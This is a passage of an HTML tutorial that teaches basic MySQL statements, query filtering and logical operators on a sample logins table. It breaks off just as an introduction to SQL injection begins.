+<p>We inserted a username-password pair in the example above while skipping the <code>id</code> and <code>date_of_joining</code> columns.</p>
+<p>Note: The examples insert cleartext passwords into the table, for demonstration only. This is a bad practice, as passwords should always be hashed/encrypted before storage.</p>
+<p>We can also insert multiple records at once by separating them with a comma:</p>
+<p>SQL Statements</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">mysql</span>&gt; <span class="hljs-selector-tag">INSERT</span> <span class="hljs-selector-tag">INTO</span> <span class="hljs-selector-tag">logins</span>(username, password) <span class="hljs-selector-tag">VALUES</span> (<span class="hljs-string">'john'</span>, <span class="hljs-string">'john123!'</span>), (<span class="hljs-string">'tom'</span>, <span class="hljs-string">'tom123!'</span>);
+
+<span class="hljs-selector-tag">Query</span> <span class="hljs-selector-tag">OK</span>, <span class="hljs-selector-tag">2</span> <span class="hljs-selector-tag">rows</span> <span class="hljs-selector-tag">affected</span> (<span class="hljs-number">0.00</span> sec)
+<span class="hljs-selector-tag">Records</span>: <span class="hljs-selector-tag">2</span>  <span class="hljs-selector-tag">Duplicates</span>: <span class="hljs-selector-tag">0</span>  <span class="hljs-selector-tag">Warnings</span>: <span class="hljs-selector-tag">0</span>
+</code></pre>
+<p>The query above inserted two new records at once.</p>
+<hr>
+<h3 id="select-statement">SELECT Statement</h3>
+<p>Now that we have inserted data into tables let us see how to retrieve data with the <a href="https://dev.mysql.com/doc/refman/8.0/en/select.html">SELECT</a> statement. This statement can also be used for many other purposes, which we will come across later. The general syntax to view the entire table is as follows:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> table_name;
+</code></pre>
+<p>The asterisk symbol (*) acts as a wildcard and selects all the columns. The <code>FROM</code> keyword is used to denote the table to select from. It is possible to view data present in specific columns as well:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> column1, column2 <span class="hljs-keyword">FROM</span> table_name;
+</code></pre>
+<p>The query above will select data present in column1 and column2 only.</p>
+<p>SQL Statements</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT <span class="hljs-symbol">*</span> FROM logins;
+
++----+---------------+------------+---------------------+
+|<span class="hljs-string"> id </span>|<span class="hljs-string"> username      </span>|<span class="hljs-string"> password   </span>|<span class="hljs-string"> date_of_joining     </span>|
++----+---------------+------------+---------------------+
+|<span class="hljs-string">  1 </span>|<span class="hljs-string"> admin         </span>|<span class="hljs-string"> p@ssw0rd   </span>|<span class="hljs-string"> 2020-07-02 00:00:00 </span>|
+|<span class="hljs-string">  2 </span>|<span class="hljs-string"> administrator </span>|<span class="hljs-string"> adm1n_p@ss </span>|<span class="hljs-string"> 2020-07-02 11:30:50 </span>|
+|<span class="hljs-string">  3 </span>|<span class="hljs-string"> john          </span>|<span class="hljs-string"> john123!   </span>|<span class="hljs-string"> 2020-07-02 11:47:16 </span>|
+|<span class="hljs-string">  4 </span>|<span class="hljs-string"> tom           </span>|<span class="hljs-string"> tom123!    </span>|<span class="hljs-string"> 2020-07-02 11:47:16 </span>|
++----+---------------+------------+---------------------+
+4 rows in set (0.00 sec)
+
+
+mysql&gt; SELECT username,password FROM logins;
+
++---------------+------------+
+|<span class="hljs-string"> username      </span>|<span class="hljs-string"> password   </span>|
++---------------+------------+
+|<span class="hljs-string"> admin         </span>|<span class="hljs-string"> p@ssw0rd   </span>|
+|<span class="hljs-string"> administrator </span>|<span class="hljs-string"> adm1n_p@ss </span>|
+|<span class="hljs-string"> john          </span>|<span class="hljs-string"> john123!   </span>|
+|<span class="hljs-string"> tom           </span>|<span class="hljs-string"> tom123!    </span>|
++---------------+------------+
+4 rows in set (0.00 sec)
+</code></pre>
+<p>The first query in the example above looks at all records present in the logins table. We can see the four records which were entered before. The second query selects just the username and password columns while skipping the other two.</p>
+<hr>
+<h3 id="drop-statement">DROP Statement</h3>
+<p>We can use <a href="https://dev.mysql.com/doc/refman/8.0/en/drop-table.html">DROP</a> to remove tables and databases from the server.</p>
+<p>SQL Statements</p>
+<pre><code class="lang-shell-session">mysql&gt; DROP <span class="hljs-keyword">TABLE</span> logins;
+
+Query OK, <span class="hljs-number">0</span> rows affected (<span class="hljs-number">0.01</span> sec)
+
+
+mysql&gt; SHOW TABLES;
+
+Empty <span class="hljs-keyword">set</span> (0.00 sec)
+</code></pre>
+<p>As we can see, the table was removed entirely.</p>
+<p>The 'DROP' statement will permanently and completely delete the table with no confirmation, so it should be used with caution.</p>
+<hr>
+<h3 id="alter-statement">ALTER Statement</h3>
+<p>Finally, We can use <a href="https://dev.mysql.com/doc/refman/8.0/en/alter-table.html">ALTER</a> to change the name of any table and any of its fields or to delete or add a new column to an existing table. The below example adds a new column <code>newColumn</code> to the <code>logins</code> table using <code>ADD</code>:</p>
+<p>SQL Statements</p>
+<pre><code class="lang-shell-session">mysql&gt; ALTER TABLE logins <span class="hljs-keyword">ADD</span><span class="bash"> newColumn INT;
+</span>
+Query OK, <span class="hljs-number">0</span> rows affected (<span class="hljs-number">0.01</span> sec)
+</code></pre>
+<p>To rename a column, we can use <code>RENAME COLUMN</code>:</p>
+<p>SQL Statements</p>
+<pre><code class="lang-shell-session">mysql&gt; ALTER TABLE logins RENAME <span class="hljs-built_in">COLUMN</span> newColumn TO oldColumn;
+
+Query OK, <span class="hljs-number">0</span> <span class="hljs-built_in">rows</span> affected (<span class="hljs-number">0.01</span> <span class="hljs-built_in">sec</span>)
+</code></pre>
+<p>We can also change a column's datatype with <code>MODIFY</code>:</p>
+<p>SQL Statements</p>
+<pre><code class="lang-shell-session">mysql&gt; ALTER TABLE logins MODIFY oldColumn <span class="hljs-built_in">DATE</span>;
+
+Query OK, <span class="hljs-number">0</span> <span class="hljs-built_in">rows</span> affected (<span class="hljs-number">0.01</span> <span class="hljs-built_in">sec</span>)
+</code></pre>
+<p>Finally, we can drop a column using <code>DROP</code>:</p>
+<p>SQL Statements</p>
+<pre><code class="lang-shell-session">mysql&gt; ALTER <span class="hljs-keyword">TABLE</span> logins <span class="hljs-comment">DROP oldColumn</span>;
+
+Query OK, <span class="hljs-number">0</span> rows affected (<span class="hljs-number">0.01</span> sec)
+</code></pre>
+<p>We can use any of the above statements with any existing table, as long as we have enough privileges to do so.</p>
+<hr>
+<h3 id="update-statement">UPDATE Statement</h3>
+<p>While <code>ALTER</code> is used to change a table's properties, the <a href="https://dev.mysql.com/doc/refman/8.0/en/update.html">UPDATE</a> statement can be used to update specific records within a table, based on certain conditions. Its general syntax is:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">UPDATE table_name SET column1=<span class="hljs-keyword">new</span><span class="hljs-type">value1</span>, column2=<span class="hljs-keyword">new</span><span class="hljs-type">value2</span>, ... WHERE &lt;condition&gt;;
+</code></pre>
+<p>We specify the table name, each column and its new value, and the condition for updating records. Let us look at an example:</p>
+<p>SQL Statements</p>
+<pre><code class="lang-shell-session">mysql&gt; UPDATE logins SET password = 'change_password' WHERE id &gt; 1;
+
+Query OK, 3 rows affected (0.00 sec)
+Rows matched: 3  Changed: 3  Warnings: 0
+
+
+mysql&gt; SELECT <span class="hljs-symbol">*</span> FROM logins;
+
++----+---------------+-----------------+---------------------+
+|<span class="hljs-string"> id </span>|<span class="hljs-string"> username      </span>|<span class="hljs-string"> password        </span>|<span class="hljs-string"> date_of_joining     </span>|
++----+---------------+-----------------+---------------------+
+|<span class="hljs-string">  1 </span>|<span class="hljs-string"> admin         </span>|<span class="hljs-string"> p@ssw0rd        </span>|<span class="hljs-string"> 2020-07-02 00:00:00 </span>|
+|<span class="hljs-string">  2 </span>|<span class="hljs-string"> administrator </span>|<span class="hljs-string"> change_password </span>|<span class="hljs-string"> 2020-07-02 11:30:50 </span>|
+|<span class="hljs-string">  3 </span>|<span class="hljs-string"> john          </span>|<span class="hljs-string"> change_password </span>|<span class="hljs-string"> 2020-07-02 11:47:16 </span>|
+|<span class="hljs-string">  4 </span>|<span class="hljs-string"> tom           </span>|<span class="hljs-string"> change_password </span>|<span class="hljs-string"> 2020-07-02 11:47:16 </span>|
++----+---------------+-----------------+---------------------+
+4 rows in set (0.00 sec)
+</code></pre>
+<p>The query above updated all passwords in all records where the id was more significant than 1.</p>
+<p>Note: we have to specify the 'WHERE' clause with UPDATE, in order to specify which records get updated. The 'WHERE' clause will be discussed next.</p>
+<h2 id="query-results">Query Results</h2>
+<hr>
+<p>In this section, we will learn how to control the results output of any query.</p>
+<hr>
+<h3 id="sorting-results">Sorting Results</h3>
+<p>We can sort the results of any query using <a href="https://dev.mysql.com/doc/refman/8.0/en/order-by-optimization.html">ORDER BY</a> and specifying the column to sort by:</p>
+<p>Query Results</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT <span class="hljs-symbol">*</span> FROM logins ORDER BY password;
+
++----+---------------+------------+---------------------+
+|<span class="hljs-string"> id </span>|<span class="hljs-string"> username      </span>|<span class="hljs-string"> password   </span>|<span class="hljs-string"> date_of_joining     </span>|
++----+---------------+------------+---------------------+
+|<span class="hljs-string">  2 </span>|<span class="hljs-string"> administrator </span>|<span class="hljs-string"> adm1n_p@ss </span>|<span class="hljs-string"> 2020-07-02 11:30:50 </span>|
+|<span class="hljs-string">  3 </span>|<span class="hljs-string"> john          </span>|<span class="hljs-string"> john123!   </span>|<span class="hljs-string"> 2020-07-02 11:47:16 </span>|
+|<span class="hljs-string">  1 </span>|<span class="hljs-string"> admin         </span>|<span class="hljs-string"> p@ssw0rd   </span>|<span class="hljs-string"> 2020-07-02 00:00:00 </span>|
+|<span class="hljs-string">  4 </span>|<span class="hljs-string"> tom           </span>|<span class="hljs-string"> tom123!    </span>|<span class="hljs-string"> 2020-07-02 11:47:16 </span>|
++----+---------------+------------+---------------------+
+4 rows in set (0.00 sec)
+</code></pre>
+<p>By default, the sort is done in ascending order, but we can also sort the results by <code>ASC</code> or <code>DESC</code>:</p>
+<p>Query Results</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT <span class="hljs-symbol">*</span> FROM logins ORDER BY password DESC;
+
++----+---------------+------------+---------------------+
+|<span class="hljs-string"> id </span>|<span class="hljs-string"> username      </span>|<span class="hljs-string"> password   </span>|<span class="hljs-string"> date_of_joining     </span>|
++----+---------------+------------+---------------------+
+|<span class="hljs-string">  4 </span>|<span class="hljs-string"> tom           </span>|<span class="hljs-string"> tom123!    </span>|<span class="hljs-string"> 2020-07-02 11:47:16 </span>|
+|<span class="hljs-string">  1 </span>|<span class="hljs-string"> admin         </span>|<span class="hljs-string"> p@ssw0rd   </span>|<span class="hljs-string"> 2020-07-02 00:00:00 </span>|
+|<span class="hljs-string">  3 </span>|<span class="hljs-string"> john          </span>|<span class="hljs-string"> john123!   </span>|<span class="hljs-string"> 2020-07-02 11:47:16 </span>|
+|<span class="hljs-string">  2 </span>|<span class="hljs-string"> administrator </span>|<span class="hljs-string"> adm1n_p@ss </span>|<span class="hljs-string"> 2020-07-02 11:30:50 </span>|
++----+---------------+------------+---------------------+
+4 rows in set (0.00 sec)
+</code></pre>
+<p>It is also possible to sort by multiple columns, to have a secondary sort for duplicate values in one column:</p>
+<p>Query Results</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT <span class="hljs-symbol">*</span> FROM logins ORDER BY password DESC, id ASC;
+
++----+---------------+-----------------+---------------------+
+|<span class="hljs-string"> id </span>|<span class="hljs-string"> username      </span>|<span class="hljs-string"> password        </span>|<span class="hljs-string"> date_of_joining     </span>|
++----+---------------+-----------------+---------------------+
+|<span class="hljs-string">  1 </span>|<span class="hljs-string"> admin         </span>|<span class="hljs-string"> p@ssw0rd        </span>|<span class="hljs-string"> 2020-07-02 00:00:00 </span>|
+|<span class="hljs-string">  2 </span>|<span class="hljs-string"> administrator </span>|<span class="hljs-string"> change_password </span>|<span class="hljs-string"> 2020-07-02 11:30:50 </span>|
+|<span class="hljs-string">  3 </span>|<span class="hljs-string"> john          </span>|<span class="hljs-string"> change_password </span>|<span class="hljs-string"> 2020-07-02 11:47:16 </span>|
+|<span class="hljs-string">  4 </span>|<span class="hljs-string"> tom           </span>|<span class="hljs-string"> change_password </span>|<span class="hljs-string"> 2020-07-02 11:50:20 </span>|
++----+---------------+-----------------+---------------------+
+4 rows in set (0.00 sec)
+</code></pre>
+<hr>
+<h3 id="limit-results">LIMIT results</h3>
+<p>In case our query returns a large number of records, we can <a href="https://dev.mysql.com/doc/refman/8.0/en/limit-optimization.html">LIMIT</a> the results to what we want only, using <code>LIMIT</code> and the number of records we want:</p>
+<p>Query Results</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT * FROM logins LIMIT 2;
+
+<span class="hljs-code">+----+</span>---------------<span class="hljs-code">+------------+</span>---------------------+
+<span class="hljs-section">| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+</span>
+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
+<span class="hljs-section">|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
++----+---------------+------------+---------------------+</span>
+2 rows in set (0.00 sec)
+</code></pre>
+<p>If we wanted to LIMIT results with an offset, we could specify the offset before the LIMIT count:</p>
+<p>Query Results</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT * FROM logins LIMIT <span class="hljs-number">1</span>, <span class="hljs-number">2</span>;
+
++----+---------------+------------+---------------------+
+| <span class="hljs-type">id</span> | <span class="hljs-type">username</span>      | <span class="hljs-type">password</span>   | <span class="hljs-type">date_of_joining</span>     |
+<span class="hljs-type">+----+---------------+------------+---------------------+
+|  2</span> | <span class="hljs-type">administrator</span> | <span class="hljs-type">adm1n_p</span>@ss | <span class="hljs-type">2020</span><span class="hljs-number">-07</span><span class="hljs-number">-02</span> <span class="hljs-number">11</span>:<span class="hljs-number">30</span>:<span class="hljs-number">50</span> |
+<span class="hljs-type">|  3</span> | <span class="hljs-type">john</span>          | <span class="hljs-type">john123</span>!   | <span class="hljs-type">2020</span><span class="hljs-number">-07</span><span class="hljs-number">-02</span> <span class="hljs-number">11</span>:<span class="hljs-number">47</span>:<span class="hljs-number">16</span> |
+<span class="hljs-type">+----+---------------+------------+---------------------+
+2</span> rows <span class="hljs-built_in">in</span> <span class="hljs-built_in">set</span> (<span class="hljs-number">0.00</span> sec)
+</code></pre>
+<p>Note: the offset marks the order of the first record to be included, starting from 0. For the above, it starts and includes the 2nd record, and returns two values.</p>
+<hr>
+<h3 id="where-clause">WHERE Clause</h3>
+<p>To filter or search for specific data, we can use conditions with the <code>SELECT</code> statement using the <a href="https://dev.mysql.com/doc/refman/8.0/en/where-optimization.html">WHERE</a> clause, to fine-tune the results:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> &lt;condition&gt;;
+</code></pre>
+<p>The query above will return all records which satisfy the given condition. Let us look at an example:</p>
+<p>Query Results</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT <span class="hljs-symbol">*</span> FROM logins WHERE id &gt; 1;
+
++----+---------------+------------+---------------------+
+|<span class="hljs-string"> id </span>|<span class="hljs-string"> username      </span>|<span class="hljs-string"> password   </span>|<span class="hljs-string"> date_of_joining     </span>|
++----+---------------+------------+---------------------+
+|<span class="hljs-string">  2 </span>|<span class="hljs-string"> administrator </span>|<span class="hljs-string"> adm1n_p@ss </span>|<span class="hljs-string"> 2020-07-02 11:30:50 </span>|
+|<span class="hljs-string">  3 </span>|<span class="hljs-string"> john          </span>|<span class="hljs-string"> john123!   </span>|<span class="hljs-string"> 2020-07-02 11:47:16 </span>|
+|<span class="hljs-string">  4 </span>|<span class="hljs-string"> tom           </span>|<span class="hljs-string"> tom123!    </span>|<span class="hljs-string"> 2020-07-02 11:47:16 </span>|
++----+---------------+------------+---------------------+
+3 rows in set (0.00 sec)
+</code></pre>
+<p>The example above selects all records where the value of <code>id</code> is greater than <code>1</code>. As we can see, the first row with its <code>id</code> as 1 was skipped from the output. We can do something similar for usernames:</p>
+<p>Query Results</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT * FROM logins where username = <span class="hljs-emphasis">'admin'</span>;
+
+<span class="hljs-code">+----+</span>----------<span class="hljs-code">+----------+</span>---------------------+
+<span class="hljs-section">| id | username | password | date_of_joining     |
++----+----------+----------+---------------------+</span>
+<span class="hljs-section">|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
++----+----------+----------+---------------------+</span>
+1 row in set (0.00 sec)
+</code></pre>
+<p>The query above selects the record where the username is <code>admin</code>. We can use the <code>UPDATE</code> statement to update certain records that meet a specific condition.</p>
+<p>Note: String and date data types should be surrounded by single quote (') or double quotes ("), while numbers can be used directly.</p>
+<hr>
+<h3 id="like-clause">LIKE Clause</h3>
+<p>Another useful SQL clause is <a href="https://dev.mysql.com/doc/refman/8.0/en/pattern-matching.html">LIKE</a>, enabling selecting records by matching a certain pattern. The query below retrieves all records with usernames starting with <code>admin</code>:</p>
+<p>Query Results</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT * FROM logins WHERE username LIKE <span class="hljs-emphasis">'admin%'</span>;
+
+<span class="hljs-code">+----+</span>---------------<span class="hljs-code">+------------+</span>---------------------+
+<span class="hljs-section">| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+</span>
+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
+<span class="hljs-section">|  4 | administrator | adm1n_p@ss | 2020-07-02 15:19:02 |
++----+---------------+------------+---------------------+</span>
+2 rows in set (0.00 sec)
+</code></pre>
+<p>The <code>%</code> symbol acts as a wildcard and matches all characters after <code>admin</code>. It is used to match zero or more characters. Similarly, the <code>_</code> symbol is used to match exactly one character. The below query matches all usernames with exactly three characters in them, which in this case was <code>tom</code>:</p>
+<p>Query Results</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT * FROM logins WHERE username like <span class="hljs-emphasis">'___'</span>;
+
+<span class="hljs-code">+----+</span>----------<span class="hljs-code">+----------+</span>---------------------+
+<span class="hljs-section">| id | username | password | date_of_joining     |
++----+----------+----------+---------------------+</span>
+<span class="hljs-section">|  3 | tom      | tom123!  | 2020-07-02 15:18:56 |
++----+----------+----------+---------------------+</span>
+1 row in set (0.01 sec)
+</code></pre>
+<h2 id="sql-operators">SQL Operators</h2>
+<hr>
+<p>Sometimes, expressions with a single condition are not enough to satisfy the user's requirement. For that, SQL supports <a href="https://dev.mysql.com/doc/refman/8.0/en/logical-operators.html">Logical Operators</a> to use multiple conditions at once. The most common logical operators are <code>AND</code>, <code>OR</code>, and <code>NOT</code>.</p>
+<hr>
+<h3 id="and-operator">AND Operator</h3>
+<p>The <code>AND</code> operator takes in two conditions and returns <code>true</code> or <code>false</code> based on their evaluation:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">condition1 <span class="hljs-keyword">AND</span> condition2
+</code></pre>
+<p>The result of the <code>AND</code> operation is <code>true</code> if and only if both <code>condition1</code> and <code>condition2</code> evaluate to <code>true</code>:</p>
+<p>SQL Operators</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT 1 = 1 AND <span class="hljs-emphasis">'test'</span> = <span class="hljs-emphasis">'test'</span>;
+
+<span class="hljs-code">+---------------------------+</span>
+<span class="hljs-section">| 1 = 1 AND 'test' = 'test' |
++---------------------------+</span>
+<span class="hljs-section">|                         1 |
++---------------------------+</span>
+1 row in set (0.00 sec)
+
+mysql&gt; SELECT 1 = 1 AND <span class="hljs-emphasis">'test'</span> = <span class="hljs-emphasis">'abc'</span>;
+
+<span class="hljs-code">+--------------------------+</span>
+<span class="hljs-section">| 1 = 1 AND 'test' = 'abc' |
++--------------------------+</span>
+<span class="hljs-section">|                        0 |
++--------------------------+</span>
+1 row in set (0.00 sec)
+</code></pre>
+<p>In MySQL terms, any <code>non-zero</code> value is considered <code>true</code>, and it usually returns the value <code>1</code> to signify <code>true</code>. <code>0</code> is considered <code>false</code>. As we can see in the example above, the first query returned <code>true</code> as both expressions were evaluated as <code>true</code>. However, the second query returned <code>false</code> as the second condition <code>'test' = 'abc'</code> is <code>false</code>.</p>
+<hr>
+<h3 id="or-operator">OR Operator</h3>
+<p>The <code>OR</code> operator takes in two expressions as well, and returns <code>true</code> when at least one of them evaluates to <code>true</code>:</p>
+<p>SQL Operators</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT 1 = 1 OR <span class="hljs-emphasis">'test'</span> = <span class="hljs-emphasis">'abc'</span>;
+
+<span class="hljs-code">+-------------------------+</span>
+<span class="hljs-section">| 1 = 1 OR 'test' = 'abc' |
++-------------------------+</span>
+<span class="hljs-section">|                       1 |
++-------------------------+</span>
+1 row in set (0.00 sec)
+
+mysql&gt; SELECT 1 = 2 OR <span class="hljs-emphasis">'test'</span> = <span class="hljs-emphasis">'abc'</span>;
+
+<span class="hljs-code">+-------------------------+</span>
+<span class="hljs-section">| 1 = 2 OR 'test' = 'abc' |
++-------------------------+</span>
+<span class="hljs-section">|                       0 |
++-------------------------+</span>
+1 row in set (0.00 sec)
+</code></pre>
+<p>The queries above demonstrate how the <code>OR</code> operator works. The first query evaluated to <code>true</code> as the condition <code>1 = 1</code> is <code>true</code>. The second query has two <code>false</code> conditions, resulting in <code>false</code> output.</p>
+<hr>
+<h3 id="not-operator">NOT Operator</h3>
+<p>The <code>NOT</code> operator simply toggles a <code>boolean</code> value 'i.e. <code>true</code> is converted to <code>false</code> and vice versa':</p>
+<p>SQL Operators</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT NOT 1 = 1;
+
+<span class="hljs-code">+-----------+</span>
+<span class="hljs-section">| NOT 1 = 1 |
++-----------+</span>
+<span class="hljs-section">|         0 |
++-----------+</span>
+1 row in set (0.00 sec)
+
+mysql&gt; SELECT NOT 1 = 2;
+
+<span class="hljs-code">+-----------+</span>
+<span class="hljs-section">| NOT 1 = 2 |
++-----------+</span>
+<span class="hljs-section">|         1 |
++-----------+</span>
+1 row in set (0.00 sec)
+</code></pre>
+<p>As seen in the examples above, the first query resulted in <code>false</code> because it is the inverse of the evaluation of <code>1 = 1</code>, which is <code>true</code>, so its inverse is <code>false</code>. On the other hand, the second was query returned <code>true</code>, as the inverse of <code>1 = 2</code> 'which is <code>false</code>' is <code>true</code>.</p>
+<hr>
+<h3 id="symbol-operators">Symbol Operators</h3>
+<p>The <code>AND</code>, <code>OR</code> and <code>NOT</code> operators can also be represented as <code>&amp;&amp;</code>, <code>||</code> and <code>!</code>, respectively. The below are the same previous examples, by using the symbol operators:</p>
+<p>SQL Operators</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT 1 = 1 &amp;&amp; <span class="hljs-emphasis">'test'</span> = <span class="hljs-emphasis">'abc'</span>;
+
+<span class="hljs-code">+-------------------------+</span>
+<span class="hljs-section">| 1 = 1 &amp;&amp; 'test' = 'abc' |
++-------------------------+</span>
+<span class="hljs-section">|                       0 |
++-------------------------+</span>
+1 row in set, 1 warning (0.00 sec)
+
+mysql&gt; SELECT 1 = 1 || <span class="hljs-emphasis">'test'</span> = <span class="hljs-emphasis">'abc'</span>;
+
+<span class="hljs-code">+-------------------------+</span>
+<span class="hljs-section">| 1 = 1 || 'test' = 'abc' |
++-------------------------+</span>
+<span class="hljs-section">|                       1 |
++-------------------------+</span>
+1 row in set, 1 warning (0.00 sec)
+
+mysql&gt; SELECT 1 != 1;
+
+<span class="hljs-code">+--------+</span>
+<span class="hljs-section">| 1 != 1 |
++--------+</span>
+<span class="hljs-section">|      0 |
++--------+</span>
+1 row in set (0.00 sec)
+</code></pre>
+<hr>
+<h3 id="operators-in-queries">Operators in queries</h3>
+<p>Let us look at how these operators can be used in queries. The following query lists all records where the <code>username</code> is NOT <code>john</code>:</p>
+<p>SQL Operators</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT <span class="hljs-symbol">*</span> FROM logins WHERE username != 'john';
+
++----+---------------+------------+---------------------+
+|<span class="hljs-string"> id </span>|<span class="hljs-string"> username      </span>|<span class="hljs-string"> password   </span>|<span class="hljs-string"> date_of_joining     </span>|
++----+---------------+------------+---------------------+
+|<span class="hljs-string">  1 </span>|<span class="hljs-string"> admin         </span>|<span class="hljs-string"> p@ssw0rd   </span>|<span class="hljs-string"> 2020-07-02 00:00:00 </span>|
+|<span class="hljs-string">  2 </span>|<span class="hljs-string"> administrator </span>|<span class="hljs-string"> adm1n_p@ss </span>|<span class="hljs-string"> 2020-07-02 11:30:50 </span>|
+|<span class="hljs-string">  4 </span>|<span class="hljs-string"> tom           </span>|<span class="hljs-string"> tom123!    </span>|<span class="hljs-string"> 2020-07-02 11:47:16 </span>|
++----+---------------+------------+---------------------+
+3 rows in set (0.00 sec)
+</code></pre>
+<p>The next query selects users who have their <code>id</code> greater than <code>1</code> AND <code>username</code> NOT equal to <code>john</code>:</p>
+<p>SQL Operators</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT * FROM logins WHERE username != 'john' AND id &gt; <span class="hljs-number">1</span>;
+
++----+---------------+------------+---------------------+
+| <span class="hljs-type">id</span> | <span class="hljs-type">username</span>      | <span class="hljs-type">password</span>   | <span class="hljs-type">date_of_joining</span>     |
+<span class="hljs-type">+----+---------------+------------+---------------------+
+|  2</span> | <span class="hljs-type">administrator</span> | <span class="hljs-type">adm1n_p</span>@ss | <span class="hljs-type">2020</span><span class="hljs-number">-07</span><span class="hljs-number">-02</span> <span class="hljs-number">11</span>:<span class="hljs-number">30</span>:<span class="hljs-number">50</span> |
+<span class="hljs-type">|  4</span> | <span class="hljs-type">tom</span>           | <span class="hljs-type">tom123</span>!    | <span class="hljs-type">2020</span><span class="hljs-number">-07</span><span class="hljs-number">-02</span> <span class="hljs-number">11</span>:<span class="hljs-number">47</span>:<span class="hljs-number">16</span> |
+<span class="hljs-type">+----+---------------+------------+---------------------+
+2</span> rows <span class="hljs-built_in">in</span> <span class="hljs-built_in">set</span> (<span class="hljs-number">0.00</span> sec)
+</code></pre>
+<hr>
+<h3 id="multiple-operator-precedence">Multiple Operator Precedence</h3>
+<p>SQL supports various other operations such as addition, division as well as bitwise operations. Thus, a query could have multiple expressions with multiple operations at once. The order of these operations is decided through operator precedence.</p>
+<p>Here is a list of common operations and their precedence, as seen in the <a href="https://mariadb.com/kb/en/operator-precedence/">MariaDB Documentation</a>:</p>
+<ul>
+<li>Division (<code>/</code>), Multiplication (<code>*</code>), and Modulus (<code>%</code>)</li>
+<li>Addition (<code>+</code>) and subtraction (<code>-</code>)</li>
+<li>Comparison (<code>=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>!=</code>, <code>LIKE</code>)</li>
+<li>NOT (<code>!</code>)</li>
+<li>AND (<code>&amp;&amp;</code>)</li>
+<li>OR (<code>||</code>)</li>
+</ul>
+<p>Operations at the top are evaluated before the ones at the bottom of the list. Let us look at an example:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> logins <span class="hljs-keyword">WHERE</span> username != <span class="hljs-string">'tom'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">id</span> &gt; <span class="hljs-number">3</span> - <span class="hljs-number">2</span>;
+</code></pre>
+<p>The query has four operations: <code>!=</code>, <code>AND</code>, <code>&gt;</code>, and <code>-</code>. From the operator precedence, we know that subtraction comes first, so it will first evaluate <code>3 - 2</code> to <code>1</code>:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> logins <span class="hljs-keyword">WHERE</span> username != <span class="hljs-string">'tom'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">id</span> &gt; <span class="hljs-number">1</span>;
+</code></pre>
+<p>Next, we have two comparison operations, <code>&gt;</code> and <code>!=</code>. Both of these are of the same precedence and will be evaluated together. So, it will return all records where username is not <code>tom</code>, and all records where the <code>id</code> is greater than 1, and then apply <code>AND</code> to return all records with both of these conditions:</p>
+<p>SQL Operators</p>
+<pre><code class="lang-shell-session">mysql&gt; select * from logins <span class="hljs-keyword">where</span> username != 'tom' AND id &gt; <span class="hljs-number">3</span> - <span class="hljs-number">2</span>;
+
++----+---------------+------------+---------------------+
+| <span class="hljs-type">id</span> | <span class="hljs-type">username</span>      | <span class="hljs-type">password</span>   | <span class="hljs-type">date_of_joining</span>     |
+<span class="hljs-type">+----+---------------+------------+---------------------+
+|  2</span> | <span class="hljs-type">administrator</span> | <span class="hljs-type">adm1n_p</span>@ss | <span class="hljs-type">2020</span><span class="hljs-number">-07</span><span class="hljs-number">-03</span> <span class="hljs-number">12</span>:<span class="hljs-number">03</span>:<span class="hljs-number">53</span> |
+<span class="hljs-type">|  3</span> | <span class="hljs-type">john</span>          | <span class="hljs-type">john123</span>!   | <span class="hljs-type">2020</span><span class="hljs-number">-07</span><span class="hljs-number">-03</span> <span class="hljs-number">12</span>:<span class="hljs-number">03</span>:<span class="hljs-number">57</span> |
+<span class="hljs-type">+----+---------------+------------+---------------------+
+2</span> rows <span class="hljs-built_in">in</span> <span class="hljs-built_in">set</span> (<span class="hljs-number">0.00</span> sec)
+</code></pre>
+<p>We will see a few other scenarios of operator precedence in the upcoming sections.</p>
+<h2 id="intro-to-sql-injections">Intro to SQL Injections</h2>
+<hr>
+<p>Now that we have a general idea of how MySQL and SQL queries work let us learn about SQL injections.</p>
+<hr>
+<h3 id="use-of-sql-in-web-applications">Use of SQL in Web Applications</h3>
+<p>First, let us see how web applications use databases MySQL, in this case, to store and retrieve data. Once a DBMS is installed and set up on the back-end server and is up and running, the web applications can start utilizing it to store and retrieve data.</p>
